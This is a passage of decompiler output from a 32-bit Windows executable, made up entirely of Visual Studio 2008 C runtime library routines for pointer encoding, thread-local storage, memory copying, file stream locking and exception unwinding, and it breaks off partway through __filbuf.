__invoke_watson(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)

{
  uint uVar1;
  BOOL BVar2;
  LONG LVar3;
  HANDLE hProcess;
  UINT uExitCode;
  EXCEPTION_RECORD local_32c;
  _EXCEPTION_POINTERS local_2dc;
  undefined4 local_2d4;
  
  uVar1 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  local_32c.ExceptionCode = 0;
  _memset(&local_32c.ExceptionFlags,0,0x4c);
  local_2dc.ExceptionRecord = &local_32c;
  local_2dc.ContextRecord = (PCONTEXT)&local_2d4;
  local_2d4 = 0x10001;
  local_32c.ExceptionCode = 0xc0000417;
  local_32c.ExceptionFlags = 1;
  BVar2 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter(&local_2dc);
  if ((LVar3 == 0) && (BVar2 == 0)) {
    FUN_00422702();
  }
  uExitCode = 0xc0000417;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __invalid_parameter
// 
// Library: Visual Studio 2008 Release

void __cdecl
__invalid_parameter(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,
                   uintptr_t param_5)

{
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)__decode_pointer(DAT_004362e4);
  if (UNRECOVERED_JUMPTABLE != (code *)0x0) {
                    // WARNING: Could not recover jumptable at 0x0041933e. Too many branches
                    // WARNING: Treating indirect jump as call
    (*UNRECOVERED_JUMPTABLE)();
    return;
  }
  FUN_00422702();
                    // WARNING: Subroutine does not return
  __invoke_watson(param_1,param_2,param_3,param_4,param_5);
}



// Library Function - Single Match
//  __encode_pointer
// 
// Library: Visual Studio 2008 Release

int __cdecl __encode_pointer(int param_1)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  
  pvVar1 = TlsGetValue(DAT_00432dc4);
  if ((pvVar1 != (LPVOID)0x0) && (DAT_00432dc0 != -1)) {
    iVar3 = DAT_00432dc0;
    pcVar2 = (code *)TlsGetValue(DAT_00432dc4);
    iVar3 = (*pcVar2)(iVar3);
    if (iVar3 != 0) {
      pFVar4 = *(FARPROC *)(iVar3 + 0x1f8);
      goto LAB_004193ae;
    }
  }
  hModule = GetModuleHandleW(L"KERNEL32.DLL");
  if ((hModule == (HMODULE)0x0) &&
     (hModule = (HMODULE)__crt_waiting_on_module_handle(L"KERNEL32.DLL"), hModule == (HMODULE)0x0))
  {
    return param_1;
  }
  pFVar4 = GetProcAddress(hModule,"EncodePointer");
LAB_004193ae:
  if (pFVar4 != (FARPROC)0x0) {
    param_1 = (*pFVar4)(param_1);
  }
  return param_1;
}



// Library Function - Single Match
//  __encoded_null
// 
// Library: Visual Studio 2008 Release

void __encoded_null(void)

{
  __encode_pointer(0);
  return;
}



// Library Function - Single Match
//  __decode_pointer
// 
// Library: Visual Studio 2008 Release

int __cdecl __decode_pointer(int param_1)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  
  pvVar1 = TlsGetValue(DAT_00432dc4);
  if ((pvVar1 != (LPVOID)0x0) && (DAT_00432dc0 != -1)) {
    iVar3 = DAT_00432dc0;
    pcVar2 = (code *)TlsGetValue(DAT_00432dc4);
    iVar3 = (*pcVar2)(iVar3);
    if (iVar3 != 0) {
      pFVar4 = *(FARPROC *)(iVar3 + 0x1fc);
      goto LAB_00419429;
    }
  }
  hModule = GetModuleHandleW(L"KERNEL32.DLL");
  if ((hModule == (HMODULE)0x0) &&
     (hModule = (HMODULE)__crt_waiting_on_module_handle(L"KERNEL32.DLL"), hModule == (HMODULE)0x0))
  {
    return param_1;
  }
  pFVar4 = GetProcAddress(hModule,"DecodePointer");
LAB_00419429:
  if (pFVar4 != (FARPROC)0x0) {
    param_1 = (*pFVar4)(param_1);
  }
  return param_1;
}



// Library Function - Single Match
//  ___set_flsgetvalue
// 
// Library: Visual Studio 2008 Release

LPVOID ___set_flsgetvalue(void)

{
  LPVOID lpTlsValue;
  
  lpTlsValue = TlsGetValue(DAT_00432dc4);
  if (lpTlsValue == (LPVOID)0x0) {
    lpTlsValue = (LPVOID)__decode_pointer(DAT_004362ec);
    TlsSetValue(DAT_00432dc4,lpTlsValue);
  }
  return lpTlsValue;
}



// Library Function - Single Match
//  __mtterm
// 
// Library: Visual Studio 2008 Release

void __cdecl __mtterm(void)

{
  code *pcVar1;
  int iVar2;
  
  if (DAT_00432dc0 != -1) {
    iVar2 = DAT_00432dc0;
    pcVar1 = (code *)__decode_pointer(DAT_004362f4);
    (*pcVar1)(iVar2);
    DAT_00432dc0 = -1;
  }
  if (DAT_00432dc4 != 0xffffffff) {
    TlsFree(DAT_00432dc4);
    DAT_00432dc4 = 0xffffffff;
  }
  __mtdeletelocks();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __initptd
// 
// Library: Visual Studio 2008 Release

void __cdecl __initptd(_ptiddata _Ptd,pthreadlocinfo _Locale)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(L"KERNEL32.DLL");
  if (hModule == (HMODULE)0x0) {
    hModule = (HMODULE)__crt_waiting_on_module_handle(L"KERNEL32.DLL");
  }
  _Ptd->_pxcptacttab = &DAT_0042b508;
  _Ptd->_holdrand = 1;
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,"EncodePointer");
    *(FARPROC *)((_Ptd->_setloc_data)._cacheout + 0x1d) = pFVar1;
    pFVar1 = GetProcAddress(hModule,"DecodePointer");
    *(FARPROC *)((_Ptd->_setloc_data)._cacheout + 0x1f) = pFVar1;
  }
  _Ptd->_ownlocale = 1;
  *(undefined *)((_Ptd->_setloc_data)._cachein + 8) = 0x43;
  *(undefined *)((int)(_Ptd->_setloc_data)._cachein + 0x93) = 0x43;
  _Ptd->ptmbcinfo = (pthreadmbcinfo)&DAT_00433378;
  __lock(0xd);
  InterlockedIncrement(&_Ptd->ptmbcinfo->refcount);
  FUN_0041958a();
  __lock(0xc);
  _Ptd->ptlocinfo = _Locale;
  if (_Locale == (pthreadlocinfo)0x0) {
    _Ptd->ptlocinfo = (pthreadlocinfo)PTR_DAT_00433980;
  }
  ___addlocaleref(&_Ptd->ptlocinfo->refcount);
  FUN_00419593();
  return;
}



void FUN_0041958a(void)

{
  FUN_0041be7c(0xd);
  return;
}



void FUN_00419593(void)

{
  FUN_0041be7c(0xc);
  return;
}



// Library Function - Single Match
//  __getptd_noexit
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl __getptd_noexit(void)

{
  DWORD dwErrCode;
  code *pcVar1;
  _ptiddata _Ptd;
  int iVar2;
  DWORD DVar3;
  undefined4 uVar4;
  _ptiddata p_Var5;
  
  dwErrCode = GetLastError();
  uVar4 = DAT_00432dc0;
  pcVar1 = (code *)___set_flsgetvalue();
  _Ptd = (_ptiddata)(*pcVar1)(uVar4);
  if (_Ptd == (_ptiddata)0x0) {
    _Ptd = (_ptiddata)__calloc_crt(1,0x214);
    if (_Ptd != (_ptiddata)0x0) {
      uVar4 = DAT_00432dc0;
      p_Var5 = _Ptd;
      pcVar1 = (code *)__decode_pointer(DAT_004362f0);
      iVar2 = (*pcVar1)(uVar4,p_Var5);
      if (iVar2 == 0) {
        _free(_Ptd);
        _Ptd = (_ptiddata)0x0;
      }
      else {
        __initptd(_Ptd,(pthreadlocinfo)0x0);
        DVar3 = GetCurrentThreadId();
        _Ptd->_thandle = 0xffffffff;
        _Ptd->_tid = DVar3;
      }
    }
  }
  SetLastError(dwErrCode);
  return _Ptd;
}



// Library Function - Single Match
//  __getptd
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl __getptd(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x10);
  }
  return p_Var1;
}



void FUN_00419749(void)

{
  FUN_0041be7c(0xd);
  return;
}



void FUN_00419755(void)

{
  FUN_0041be7c(0xc);
  return;
}



// Library Function - Single Match
//  __mtinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinit(void)

{
  HMODULE hModule;
  BOOL BVar1;
  int iVar2;
  code *pcVar3;
  _ptiddata _Ptd;
  DWORD DVar4;
  undefined *puVar5;
  _ptiddata p_Var6;
  
  hModule = GetModuleHandleW(L"KERNEL32.DLL");
  if (hModule == (HMODULE)0x0) {
    hModule = (HMODULE)__crt_waiting_on_module_handle(L"KERNEL32.DLL");
  }
  if (hModule != (HMODULE)0x0) {
    DAT_004362e8 = GetProcAddress(hModule,"FlsAlloc");
    DAT_004362ec = GetProcAddress(hModule,"FlsGetValue");
    DAT_004362f0 = GetProcAddress(hModule,"FlsSetValue");
    DAT_004362f4 = GetProcAddress(hModule,"FlsFree");
    if ((((DAT_004362e8 == (FARPROC)0x0) || (DAT_004362ec == (FARPROC)0x0)) ||
        (DAT_004362f0 == (FARPROC)0x0)) || (DAT_004362f4 == (FARPROC)0x0)) {
      DAT_004362ec = TlsGetValue_exref;
      DAT_004362e8 = (FARPROC)&LAB_0041943b;
      DAT_004362f0 = TlsSetValue_exref;
      DAT_004362f4 = TlsFree_exref;
    }
    DAT_00432dc4 = TlsAlloc();
    if (DAT_00432dc4 == 0xffffffff) {
      return 0;
    }
    BVar1 = TlsSetValue(DAT_00432dc4,DAT_004362ec);
    if (BVar1 == 0) {
      return 0;
    }
    __init_pointers();
    DAT_004362e8 = (FARPROC)__encode_pointer((int)DAT_004362e8);
    DAT_004362ec = (FARPROC)__encode_pointer((int)DAT_004362ec);
    DAT_004362f0 = (FARPROC)__encode_pointer((int)DAT_004362f0);
    DAT_004362f4 = (FARPROC)__encode_pointer((int)DAT_004362f4);
    iVar2 = __mtinitlocks();
    if (iVar2 != 0) {
      puVar5 = &LAB_0041962f;
      pcVar3 = (code *)__decode_pointer((int)DAT_004362e8);
      DAT_00432dc0 = (*pcVar3)(puVar5);
      if ((DAT_00432dc0 != -1) && (_Ptd = (_ptiddata)__calloc_crt(1,0x214), _Ptd != (_ptiddata)0x0))
      {
        iVar2 = DAT_00432dc0;
        p_Var6 = _Ptd;
        pcVar3 = (code *)__decode_pointer((int)DAT_004362f0);
        iVar2 = (*pcVar3)(iVar2,p_Var6);
        if (iVar2 != 0) {
          __initptd(_Ptd,(pthreadlocinfo)0x0);
          DVar4 = GetCurrentThreadId();
          _Ptd->_thandle = 0xffffffff;
          _Ptd->_tid = DVar4;
          return 1;
        }
      }
    }
  }
  __mtterm();
  return 0;
}



// Library Function - Single Match
//  _fastcopy_I
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2019

void __cdecl _fastcopy_I(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  uint uVar16;
  
  uVar16 = param_3 >> 7;
  do {
    uVar1 = param_2[1];
    uVar2 = param_2[2];
    uVar3 = param_2[3];
    uVar4 = param_2[4];
    uVar5 = param_2[5];
    uVar6 = param_2[6];
    uVar7 = param_2[7];
    uVar8 = param_2[8];
    uVar9 = param_2[9];
    uVar10 = param_2[10];
    uVar11 = param_2[0xb];
    uVar12 = param_2[0xc];
    uVar13 = param_2[0xd];
    uVar14 = param_2[0xe];
    uVar15 = param_2[0xf];
    *param_1 = *param_2;
    param_1[1] = uVar1;
    param_1[2] = uVar2;
    param_1[3] = uVar3;
    param_1[4] = uVar4;
    param_1[5] = uVar5;
    param_1[6] = uVar6;
    param_1[7] = uVar7;
    param_1[8] = uVar8;
    param_1[9] = uVar9;
    param_1[10] = uVar10;
    param_1[0xb] = uVar11;
    param_1[0xc] = uVar12;
    param_1[0xd] = uVar13;
    param_1[0xe] = uVar14;
    param_1[0xf] = uVar15;
    uVar1 = param_2[0x11];
    uVar2 = param_2[0x12];
    uVar3 = param_2[0x13];
    uVar4 = param_2[0x14];
    uVar5 = param_2[0x15];
    uVar6 = param_2[0x16];
    uVar7 = param_2[0x17];
    uVar8 = param_2[0x18];
    uVar9 = param_2[0x19];
    uVar10 = param_2[0x1a];
    uVar11 = param_2[0x1b];
    uVar12 = param_2[0x1c];
    uVar13 = param_2[0x1d];
    uVar14 = param_2[0x1e];
    uVar15 = param_2[0x1f];
    param_1[0x10] = param_2[0x10];
    param_1[0x11] = uVar1;
    param_1[0x12] = uVar2;
    param_1[0x13] = uVar3;
    param_1[0x14] = uVar4;
    param_1[0x15] = uVar5;
    param_1[0x16] = uVar6;
    param_1[0x17] = uVar7;
    param_1[0x18] = uVar8;
    param_1[0x19] = uVar9;
    param_1[0x1a] = uVar10;
    param_1[0x1b] = uVar11;
    param_1[0x1c] = uVar12;
    param_1[0x1d] = uVar13;
    param_1[0x1e] = uVar14;
    param_1[0x1f] = uVar15;
    param_2 = param_2 + 0x20;
    param_1 = param_1 + 0x20;
    uVar16 = uVar16 - 1;
  } while (uVar16 != 0);
  return;
}



// Library Function - Single Match
//  __VEC_memcpy
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

undefined4 * __cdecl __VEC_memcpy(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  undefined *puVar5;
  undefined4 *puVar6;
  undefined *puVar7;
  undefined4 *puVar8;
  
  uVar3 = (int)param_2 >> 0x1f;
  uVar3 = (((uint)param_2 ^ uVar3) - uVar3 & 0xf ^ uVar3) - uVar3;
  uVar4 = (int)param_1 >> 0x1f;
  uVar4 = (((uint)param_1 ^ uVar4) - uVar4 & 0xf ^ uVar4) - uVar4;
  if ((uVar3 | uVar4) == 0) {
    uVar3 = param_3 & 0x7f;
    if (param_3 != uVar3) {
      _fastcopy_I(param_1,param_2,param_3 - uVar3);
    }
    if (uVar3 != 0) {
      puVar5 = (undefined *)((int)param_2 + (param_3 - uVar3));
      puVar7 = (undefined *)((int)param_1 + (param_3 - uVar3));
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar7 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar7 = puVar7 + 1;
      }
    }
  }
  else if (uVar3 == uVar4) {
    iVar1 = 0x10 - uVar3;
    puVar6 = param_2;
    puVar8 = param_1;
    for (iVar2 = iVar1; iVar2 != 0; iVar2 = iVar2 + -1) {
      *(undefined *)puVar8 = *(undefined *)puVar6;
      puVar6 = (undefined4 *)((int)puVar6 + 1);
      puVar8 = (undefined4 *)((int)puVar8 + 1);
    }
    __VEC_memcpy((undefined4 *)((int)param_1 + iVar1),(undefined4 *)((int)param_2 + iVar1),
                 param_3 - iVar1);
  }
  else {
    puVar6 = param_1;
    for (uVar3 = param_3 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *puVar6 = *param_2;
      param_2 = param_2 + 1;
      puVar6 = puVar6 + 1;
    }
    for (uVar3 = param_3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined *)puVar6 = *(undefined *)param_2;
      param_2 = (undefined4 *)((int)param_2 + 1);
      puVar6 = (undefined4 *)((int)puVar6 + 1);
    }
  }
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _has_osfxsr_set
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 _has_osfxsr_set(void)

{
  return 1;
}



// WARNING: Removing unreachable block (ram,0x00419ae2)
// WARNING: Removing unreachable block (ram,0x00419acf)
// Library Function - Single Match
//  __get_sse2_info
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 __get_sse2_info(void)

{
  uint uVar1;
  int iVar2;
  undefined4 uVar3;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  uint uVar4;
  uint local_8;
  
  local_8 = 0;
  uVar4 = (uint)(in_NT & 1) * 0x4000 | (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | 0x40
          | (uint)(in_AF & 1) * 0x10 | 4 | (uint)(in_ID & 1) * 0x200000 |
          (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000
  ;
  uVar1 = uVar4 ^ 0x200000;
  if (((uint)((uVar1 & 0x4000) != 0) * 0x4000 | (uint)((uVar1 & 0x400) != 0) * 0x400 |
       (uint)((uVar1 & 0x200) != 0) * 0x200 | (uint)((uVar1 & 0x100) != 0) * 0x100 |
       (uint)((uVar1 & 0x40) != 0) * 0x40 | (uint)((uVar1 & 0x10) != 0) * 0x10 |
       (uint)((uVar1 & 4) != 0) * 4 | (uint)((uVar1 & 0x200000) != 0) * 0x200000 |
      (uint)((uVar1 & 0x40000) != 0) * 0x40000) != uVar4) {
    cpuid_basic_info(0);
    iVar2 = cpuid_Version_info(1);
    local_8 = *(uint *)(iVar2 + 8);
  }
  if (((local_8 & 0x4000000) == 0) || (iVar2 = _has_osfxsr_set(), iVar2 == 0)) {
    uVar3 = 0;
  }
  else {
    uVar3 = 1;
  }
  return uVar3;
}



undefined ** FUN_00419b14(void)

{
  return &PTR_DAT_00432dc8;
}



// Library Function - Single Match
//  __lock_file
// 
// Library: Visual Studio 2008 Release

void __cdecl __lock_file(FILE *_File)

{
  if ((_File < &PTR_DAT_00432dc8) || ((FILE *)&DAT_00433028 < _File)) {
    EnterCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  }
  else {
    __lock(((int)&_File[-0x2196f]._bufsiz >> 5) + 0x10);
    _File->_flag = _File->_flag | 0x8000;
  }
  return;
}



// Library Function - Single Match
//  __lock_file2
// 
// Library: Visual Studio 2008 Release

void __cdecl __lock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    __lock(_Index + 0x10);
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) | 0x8000;
    return;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// Library Function - Single Match
//  __unlock_file
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __unlock_file(FILE *_File)

{
  if (((FILE *)((int)&DAT_00432dc4 + 3U) < _File) && (_File < (FILE *)0x433029)) {
    _File->_flag = _File->_flag & 0xffff7fff;
    FUN_0041be7c(((int)&_File[-0x2196f]._bufsiz >> 5) + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  return;
}



// Library Function - Single Match
//  __unlock_file2
// 
// Library: Visual Studio 2008 Release

void __cdecl __unlock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) & 0xffff7fff;
    FUN_0041be7c(_Index + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wopenfile
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __wopenfile(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag,FILE *_File)

{
  bool bVar1;
  bool bVar2;
  bool bVar3;
  bool bVar4;
  wchar_t wVar5;
  int *piVar6;
  int iVar7;
  errno_t eVar8;
  uint _OpenFlag;
  wchar_t *pwVar9;
  wchar_t *pwVar10;
  uint local_8;
  
  bVar3 = false;
  bVar2 = false;
  bVar4 = false;
  for (pwVar10 = _Mode; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
  }
  wVar5 = *pwVar10;
  if (wVar5 == L'a') {
    _OpenFlag = 0x109;
LAB_00419d39:
    local_8 = DAT_00436ab8 | 2;
  }
  else {
    if (wVar5 != L'r') {
      if (wVar5 != L'w') goto LAB_00419d06;
      _OpenFlag = 0x301;
      goto LAB_00419d39;
    }
    _OpenFlag = 0;
    local_8 = DAT_00436ab8 | 1;
  }
  bVar1 = true;
  pwVar10 = pwVar10 + 1;
  wVar5 = *pwVar10;
  if (wVar5 != L'\0') {
    do {
      if (!bVar1) break;
      if ((ushort)wVar5 < 0x54) {
        if (wVar5 == L'S') {
          if (bVar2) goto LAB_00419e67;
          bVar2 = true;
          _OpenFlag = _OpenFlag | 0x20;
        }
        else if (wVar5 != L' ') {
          if (wVar5 == L'+') {
            if ((_OpenFlag & 2) != 0) goto LAB_00419e67;
            _OpenFlag = _OpenFlag & 0xfffffffe | 2;
            local_8 = local_8 & 0xfffffffc | 0x80;
          }
          else if (wVar5 == L',') {
            bVar4 = true;
LAB_00419e67:
            bVar1 = false;
          }
          else if (wVar5 == L'D') {
            if ((_OpenFlag & 0x40) != 0) goto LAB_00419e67;
            _OpenFlag = _OpenFlag | 0x40;
          }
          else if (wVar5 == L'N') {
            _OpenFlag = _OpenFlag | 0x80;
          }
          else {
            if (wVar5 != L'R') goto LAB_00419d06;
            if (bVar2) goto LAB_00419e67;
            bVar2 = true;
            _OpenFlag = _OpenFlag | 0x10;
          }
        }
      }
      else if (wVar5 == L'T') {
        if ((_OpenFlag & 0x1000) != 0) goto LAB_00419e67;
        _OpenFlag = _OpenFlag | 0x1000;
      }
      else if (wVar5 == L'b') {
        if ((_OpenFlag & 0xc000) != 0) goto LAB_00419e67;
        _OpenFlag = _OpenFlag | 0x8000;
      }
      else if (wVar5 == L'c') {
        if (bVar3) goto LAB_00419e67;
        local_8 = local_8 | 0x4000;
        bVar3 = true;
      }
      else if (wVar5 == L'n') {
        if (bVar3) goto LAB_00419e67;
        local_8 = local_8 & 0xffffbfff;
        bVar3 = true;
      }
      else {
        if (wVar5 != L't') goto LAB_00419d06;
        if ((_OpenFlag & 0xc000) != 0) goto LAB_00419e67;
        _OpenFlag = _OpenFlag | 0x4000;
      }
      pwVar10 = pwVar10 + 1;
      wVar5 = *pwVar10;
    } while (wVar5 != L'\0');
    if (bVar4) {
      for (; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
      }
      iVar7 = _wcsncmp(L"ccs",pwVar10,3);
      if (iVar7 != 0) goto LAB_00419d06;
      for (pwVar10 = pwVar10 + 3; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
      }
      if (*pwVar10 != L'=') goto LAB_00419d06;
      do {
        pwVar9 = pwVar10;
        pwVar10 = pwVar9 + 1;
      } while (*pwVar10 == L' ');
      iVar7 = __wcsnicmp(pwVar10,L"UTF-8",5);
      if (iVar7 == 0) {
        pwVar10 = pwVar9 + 6;
        _OpenFlag = _OpenFlag | 0x40000;
      }
      else {
        iVar7 = __wcsnicmp(pwVar10,L"UTF-16LE",8);
        if (iVar7 == 0) {
          pwVar10 = pwVar9 + 9;
          _OpenFlag = _OpenFlag | 0x20000;
        }
        else {
          iVar7 = __wcsnicmp(pwVar10,L"UNICODE",7);
          if (iVar7 != 0) goto LAB_00419d06;
          pwVar10 = pwVar9 + 8;
          _OpenFlag = _OpenFlag | 0x10000;
        }
      }
    }
  }
  for (; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
  }
  if (*pwVar10 == L'\0') {
    eVar8 = __wsopen_s((int *)&_Mode,_Filename,_OpenFlag,_ShFlag,0x180);
    if (eVar8 != 0) {
      return (FILE *)0x0;
    }
    _DAT_004362f8 = _DAT_004362f8 + 1;
    _File->_flag = local_8;
    _File->_cnt = 0;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_tmpfname = (char *)0x0;
    _File->_file = (int)_Mode;
    return _File;
  }
LAB_00419d06:
  piVar6 = __errno();
  *piVar6 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return (FILE *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __getstream
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __getstream(void)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  void *pvVar4;
  BOOL BVar5;
  int iVar6;
  FILE *pFVar7;
  FILE *_File;
  
  pFVar7 = (FILE *)0x0;
  __lock(1);
  iVar6 = 0;
  do {
    _File = pFVar7;
    if (DAT_00438ea0 <= iVar6) {
LAB_0041a07b:
      if (_File != (FILE *)0x0) {
        _File->_flag = _File->_flag & 0x8000;
        _File->_cnt = 0;
        _File->_base = (char *)0x0;
        _File->_ptr = (char *)0x0;
        _File->_tmpfname = (char *)0x0;
        _File->_file = -1;
      }
      FUN_0041a0ac();
      return _File;
    }
    piVar1 = (int *)(DAT_00437e80 + iVar6 * 4);
    if (*piVar1 == 0) {
      iVar6 = iVar6 * 4;
      pvVar4 = __malloc_crt(0x38);
      *(void **)(iVar6 + DAT_00437e80) = pvVar4;
      if (*(int *)(DAT_00437e80 + iVar6) != 0) {
        BVar5 = ___crtInitCritSecAndSpinCount
                          ((LPCRITICAL_SECTION)(*(int *)(DAT_00437e80 + iVar6) + 0x20),4000);
        if (BVar5 == 0) {
          _free(*(void **)(iVar6 + DAT_00437e80));
          *(undefined4 *)(iVar6 + DAT_00437e80) = 0;
        }
        else {
          EnterCriticalSection((LPCRITICAL_SECTION)(*(int *)(iVar6 + DAT_00437e80) + 0x20));
          _File = *(FILE **)(iVar6 + DAT_00437e80);
          _File->_flag = 0;
        }
      }
      goto LAB_0041a07b;
    }
    uVar2 = *(uint *)(*piVar1 + 0xc);
    if (((uVar2 & 0x83) == 0) && ((uVar2 & 0x8000) == 0)) {
      if ((iVar6 - 3U < 0x11) && (iVar3 = __mtinitlocknum(iVar6 + 0x10), iVar3 == 0))
      goto LAB_0041a07b;
      __lock_file2(iVar6,*(void **)(DAT_00437e80 + iVar6 * 4));
      _File = *(FILE **)(DAT_00437e80 + iVar6 * 4);
      if ((*(byte *)&_File->_flag & 0x83) == 0) goto LAB_0041a07b;
      __unlock_file2(iVar6,_File);
    }
    iVar6 = iVar6 + 1;
  } while( true );
}



void FUN_0041a0ac(void)

{
  FUN_0041be7c(1);
  return;
}



// Library Function - Single Match
//  __local_unwind4
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __cdecl __local_unwind4(uint *param_1,int param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  void *pvStack_28;
  undefined *puStack_24;
  uint local_20;
  uint uStack_1c;
  int iStack_18;
  uint *puStack_14;
  
  puStack_14 = param_1;
  iStack_18 = param_2;
  uStack_1c = param_3;
  puStack_24 = &LAB_0041a148;
  pvStack_28 = ExceptionList;
  local_20 = DAT_00432c20 ^ (uint)&pvStack_28;
  ExceptionList = &pvStack_28;
  while( true ) {
    uVar2 = *(uint *)(param_2 + 0xc);
    if ((uVar2 == 0xfffffffe) || ((param_3 != 0xfffffffe && (uVar2 <= param_3)))) break;
    puVar1 = (undefined4 *)((*(uint *)(param_2 + 8) ^ *param_1) + 0x10 + uVar2 * 0xc);
    *(undefined4 *)(param_2 + 0xc) = *puVar1;
    if (puVar1[1] == 0) {
      __NLG_Notify(0x101);
      FUN_004232b0();
    }
  }
  ExceptionList = pvStack_28;
  return;
}



void FUN_0041a18e(int param_1)

{
  __local_unwind4(*(uint **)(param_1 + 0x28),*(int *)(param_1 + 0x18),*(uint *)(param_1 + 0x1c));
  return;
}



// Library Function - Single Match
//  @_EH4_CallFilterFunc@8
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_CallFilterFunc_8(undefined *param_1)

{
  (*(code *)param_1)();
  return;
}



// Library Function - Single Match
//  @_EH4_TransferToHandler@8
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_TransferToHandler_8(undefined *UNRECOVERED_JUMPTABLE)

{
  __NLG_Notify(1);
                    // WARNING: Could not recover jumptable at 0x0041a1d8. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  @_EH4_GlobalUnwind@4
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_GlobalUnwind_4(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x41a1ef,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  @_EH4_LocalUnwind@16
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_LocalUnwind_16(int param_1,uint param_2,undefined4 param_3,uint *param_4)

{
  __local_unwind4(param_4,param_1,param_2);
  return;
}



// Library Function - Single Match
//  __filbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __filbuf(FILE *_File)

{
  byte bVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  char *_DstBuf;
  
  if (_File == (FILE *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    uVar4 = _File->_flag;
    if (((uVar4 & 0x83) != 0) && ((uVar4 & 0x40) == 0)) {
